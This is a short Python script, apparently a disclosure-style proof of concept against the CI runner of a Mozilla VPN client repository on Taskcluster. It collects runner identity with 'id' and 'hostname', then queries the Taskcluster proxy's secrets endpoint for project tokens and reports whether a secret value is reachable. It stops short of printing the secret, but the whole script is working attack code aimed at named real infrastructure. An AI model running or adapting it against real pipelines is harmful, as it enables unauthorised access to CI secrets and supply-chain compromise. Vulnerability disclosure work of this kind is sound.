import os, json, urllib.request, time, subprocess

# Tự động trích xuất thông tin từ môi trường CI Runner
task_id = os.environ.get('TASK_ID', 'UNKNOWN_TASK')
run_id = os.environ.get('RUN_ID', '0')
proxy_base = os.environ.get('TASKCLUSTER_PROXY_URL', 'http://taskcluster')
timestamp = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())

evidence = {
    "timestamp_utc": timestamp,
    "metadata": {
        "repository": os.environ.get('GHE_REPO_URL', 'mozilla-mobile/mozilla-vpn-client'),
        "pr_number": os.environ.get('SYSTEM_PULLREQUEST_PULLREQUESTNUMBER', 'unknown'),
        "task_id": task_id,
        "run_id": run_id
    },
    "validations": {}
}

# 1. Live Task Execution Validation (Chỉ lấy id và hostname)
try:
    res_id = subprocess.check_output(['id']).decode('utf-8').strip()
    res_host = subprocess.check_output(['hostname']).decode('utf-8').strip()
    evidence["validations"]["task_execution"] = {
        "status": "SUCCESS",
        "task_id": task_id,
        "log_snippet": f"{res_id}\n{res_host}"
    }
except Exception as e:
    evidence["validations"]["task_execution"] = {"status": "FAILURE", "error": str(e)}

# 2. Secret Capability Validation (Proxy Query - Không in secret value)
try:
    req = urllib.request.Request(f"{proxy_base}/api/secrets/v1/secret/project/mozillavpn/tokens")
    with urllib.request.urlopen(req, timeout=10) as r:
        data = json.loads(r.read().decode('utf-8'))
        evidence["validations"]["secret_capability"] = {
            "http_status": r.status,
            "access_result": "SUCCESS",
            "value_present": "secret" in data and bool(data["secret"])
        }
except Exception as e:
    evidence["validations"]["secret_capability"] = {"access_result": "FAILURE", "error": str(e)}

print("\n=== AUTOMATED PROOF OF CONCEPT EVIDENCE ===")
print(json.dumps(evidence, indent=2))
